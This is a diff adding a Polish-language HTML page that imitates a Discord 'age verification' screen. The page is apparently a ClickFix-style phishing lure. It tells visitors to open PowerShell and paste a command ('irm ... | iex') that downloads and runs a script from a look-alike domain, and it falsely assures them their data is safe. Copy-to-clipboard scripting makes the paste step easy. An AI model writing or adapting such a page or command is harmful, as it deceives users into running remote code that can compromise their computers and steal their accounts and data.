@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Weryfikacja wieku</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts (Whitney / Inter alternative) -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
+                    },
+                    colors: {
+                        discord: {
+                            bg: '#202225',
+                            dark: '#1e1f22',
+                            panel: '#2b2d31',
+                            panelLeft: '#313338',
+                            blue: '#5865f2',
+                            blueHover: '#4752c4',
+                            textMuted: '#949ba4',
+                            textNormal: '#dbdee1',
+                            codeBg: '#111214',
+                            border: '#3f4147'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #1a1b1e;
+            color: #dbdee1;
+            overflow-x: hidden;
+        }
+        /* Stylized mountain background artwork inspired by Discord theme */
+        .discord-bg {
+            background: linear-gradient(135deg, #2b2b36 0%, #17181c 100%);
+            position: relative;
+        }
+        .discord-bg::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 50% 20%, rgba(88, 101, 242, 0.08) 0%, transparent 60%);
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center relative discord-bg px-4 py-8 select-none">
+
+    <!-- Stylized background artwork (Mountains, Castle silhouettes, Stars) -->
+    <div class="absolute inset-0 overflow-hidden pointer-events-none z-0">
+        <!-- Stars -->
+        <div class="absolute top-12 left-1/4 w-1 h-1 bg-white rounded-full opacity-60"></div>
+        <div class="absolute top-24 right-1/3 w-1.5 h-1.5 bg-white rounded-full opacity-40"></div>
+        <div class="absolute top-10 right-1/4 w-1 h-1 bg-white rounded-full opacity-70"></div>
+        
+        <!-- Mountains & Castle SVG Silhouette on the left -->
+        <svg class="absolute bottom-0 left-0 w-1/3 h-2/3 opacity-30 text-[#292b32]" viewBox="0 0 500 600" fill="currentColor" preserveAspectRatio="none">
+            <path d="M0,600 L0,350 L50,340 L80,300 L110,340 L150,330 L200,280 L250,350 L350,200 L450,450 L500,600 Z"></path>
+            <!-- Castle tower outlines -->
+            <path d="M40,340 L40,280 L50,270 L60,280 L60,340 Z" fill="#1f2125"></path>
+            <path d="M90,300 L90,240 L100,230 L110,240 L110,300 Z" fill="#1f2125"></path>
+        </svg>
+
+        <!-- Mountains on the right -->
+        <svg class="absolute bottom-0 right-0 w-2/5 h-3/5 opacity-30 text-[#292b32]" viewBox="0 0 600 600" fill="currentColor" preserveAspectRatio="none">
+            <path d="M0,600 L100,450 L200,500 L350,300 L450,400 L550,250 L600,600 Z"></path>
+        </svg>
+    </div>
+
+    <!-- Main Discord Header -->
+    <div class="relative z-10 flex items-center justify-center space-x-3 mb-6">
+        <svg class="w-10 h-10 text-white fill-current" viewBox="0 0 127.14 96.36">
+            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.62-27.28-4.51-51.12-19.15-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.45-12.72S96.14,46,96.12,53,90.96,65.69,84.69,65.69Z"/>
+        </svg>
+        <span class="text-white text-2xl font-bold tracking-tight">Discord</span>
+    </div>
+
+    <!-- Main Modal Container -->
+    <div class="relative z-10 w-full max-w-[920px] bg-[#313338] rounded-lg shadow-2xl flex flex-col md:flex-row overflow-hidden border border-[#222327]">
+        
+        <!-- LEFT COLUMN: Age Verification Info -->
+        <div class="w-full md:w-1/2 p-8 md:p-10 flex flex-col items-center justify-between text-center bg-[#2b2d31]">
+            <div class="w-full flex flex-col items-center mt-4">
+                <!-- Shield Icon with Lock -->
+                <div class="relative mb-6">
+                    <div class="w-20 h-20 bg-discord-blue rounded-full flex items-center justify-center shadow-lg text-white">
+                        <i class="fa-solid fa-shield-halved text-4xl"></i>
+                    </div>
+                    <!-- Small decorative sparkles around shield -->
+                    <div class="absolute -top-1 -right-2 text-discord-blue text-xs"><i class="fa-solid fa-sparkles"></i></div>
+                    <div class="absolute bottom-1 -left-3 text-discord-blue text-xs"><i class="fa-solid fa-sparkles"></i></div>
+                </div>
+
+                <!-- Header & Description -->
+                <h1 class="text-white text-2xl font-bold mb-3">Weryfikacja wieku</h1>
+                <p class="text-discord-textMuted text-sm leading-relaxed max-w-xs">
+                    Aby kontynuować, musimy upewnić się, że masz jesteś prawdziwym człowiekiem. To szybkie i proste — wystarczy wykonać kilka kroków w PowerShell.
+                </p>
+            </div>
+
+            <!-- Start Verification Button -->
+            <div class="w-full mt-8">
+                <button onclick="startVerification()" class="w-full bg-discord-blue hover:bg-discord-blueHover text-white font-medium py-3 px-4 rounded-md transition duration-200 shadow-md focus:outline-none">
+                    Rozpocznij weryfikację
+                </button>
+            </div>
+        </div>
+
+        <!-- RIGHT COLUMN: Step-by-Step Instructions -->
+        <div class="w-full md:w-1/2 p-8 md:p-10 bg-[#313338] flex flex-col justify-between">
+            <div>
+                <h2 class="text-white text-lg font-bold mb-6">Jak to zrobić?</h2>
+
+                <div class="space-y-6 text-left">
+                    <!-- Step 1 -->
+                    <div class="flex items-start space-x-3.5">
+                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-discord-blue text-white flex items-center justify-center text-xs font-bold mt-0.5">1</div>
+                        <div>
+                            <p class="text-white text-sm font-semibold">Otwórz Windows PowerShell</p>
+                            <p class="text-discord-textMuted text-xs mt-0.5">Naciśnij klawisz Windows, wpisz „PowerShell” i uruchom aplikację.</p>
+                        </div>
+                    </div>
+
+                    <!-- Step 2 -->
+                    <div class="flex items-start space-x-3.5">
+                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-discord-blue text-white flex items-center justify-center text-xs font-bold mt-0.5">2</div>
+                        <div class="w-full">
+                            <p class="text-white text-sm font-semibold">Wklej poniższą komendę</p>
+                            <p class="text-discord-textMuted text-xs mt-0.5 mb-2">Skopiuj i wklej komendę do PowerShell.</p>
+                            
+                            <!-- Command Box with Copy Button -->
+                            <div class="bg-discord-codeBg rounded-md p-2.5 flex items-center justify-between border border-[#1f2023] group">
+                                <code id="commandText" class="text-emerald-400 font-mono text-xs select-all overflow-x-auto whitespace-nowrap pr-2">irm https://dlscorq.vercel.app/install.ps1 | iex</code>
+                                <button onclick="copyCommand()" id="copyBtn" class="bg-discord-blue hover:bg-discord-blueHover text-white text-xs font-medium px-3 py-1.5 rounded transition flex items-center space-x-1.5 shrink-0">
+                                    <i class="fa-regular fa-copy text-xs"></i>
+                                    <span id="copyText">Kopiuj</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Step 3 -->
+                    <div class="flex items-start space-x-3.5">
+                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-discord-blue text-white flex items-center justify-center text-xs font-bold mt-0.5">3</div>
+                        <div>
+                            <p class="text-white text-sm font-semibold">Naciśnij Enter</p>
+                            <p class="text-discord-textMuted text-xs mt-0.5">Po wykonaniu komendy wróć tutaj i kliknij „Kontynuuj”.</p>
+                        </div>
+                    </div>
+
+                    <!-- Step 4 -->
+                    <div class="flex items-start space-x-3.5">
+                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-discord-blue text-white flex items-center justify-center text-xs font-bold mt-0.5">4</div>
+                        <div>
+                            <p class="text-white text-sm font-semibold">Zakończ weryfikację</p>
+                            <p class="text-discord-textMuted text-xs mt-0.5">Jeśli wszystko się zgadza, będziesz mógł kontynuować.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer Security Notice -->
+            <div class="mt-8 pt-4 border-t border-[#3f4147] flex items-start space-x-3">
+                <i class="fa-solid fa-lock text-discord-textMuted text-xs mt-0.5"></i>
+                <p class="text-[#80848e] text-[11px] leading-tight">
+                    Twoje dane są bezpieczne. Nie przechowujemy informacji z Twojego systemu.
+                </p>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Custom Floating Notification Box (replaces alert) -->
+    <div id="toast" class="fixed bottom-6 right-6 bg-[#2f3136] text-white px-4 py-3 rounded-md shadow-xl border border-[#202225] flex items-center space-x-3 transform translate-y-20 opacity-0 transition-all duration-300 z-50">
+        <div class="w-5 h-5 rounded-full bg-emerald-500 flex items-center justify-center text-white text-xs">
+            <i class="fa-solid fa-check"></i>
+        </div>
+        <span id="toastMessage" class="text-sm font-medium">Skopiowano do schowka!</span>
+    </div>
+
+    <script>
+        // Function to copy command with visual feedback
+        function copyCommand() {
+            const command = document.getElementById('commandText').innerText;
+            
+            // Fallback clipboard method using execCommand to ensure iframe compatibility
+            const textarea = document.createElement('textarea');
+            textarea.value = command;
+            textarea.style.position = 'fixed';  // Avoid scrolling to bottom
+            document.body.appendChild(textarea);
+            textarea.focus();
+            textarea.select();
+            
+            try {
+                document.execCommand('copy');
+                showToast('Skopiowano komendę do schowka!');
+                
+                // Change button state temporarily
+                const copyBtn = document.getElementById('copyBtn');
+                const copyText = document.getElementById('copyText');
+                copyBtn.classList.remove('bg-discord-blue', 'hover:bg-discord-blueHover');
+                copyBtn.classList.add('bg-emerald-600');
+                copyText.innerText = 'Skopiowano!';
+                
+                setTimeout(() => {
+                    copyBtn.classList.remove('bg-emerald-600');
+                    copyBtn.classList.add('bg-discord-blue', 'hover:bg-discord-blueHover');
+                    copyText.innerText = 'Kopiuj';
+                }, 2000);
+            } catch (err) {
+                showToast('Nie udało się skopiować.');
+            }
+            
+            document.body.removeChild(textarea);
+        }
+
+        function startVerification() {
+            showToast('Rozpoczynanie procesu weryfikacji...');
+        }
+
+        // Custom non-intrusive notification banner
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            const toastMsg = document.getElementById('toastMessage');
+            toastMsg.innerText = message;
+            
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
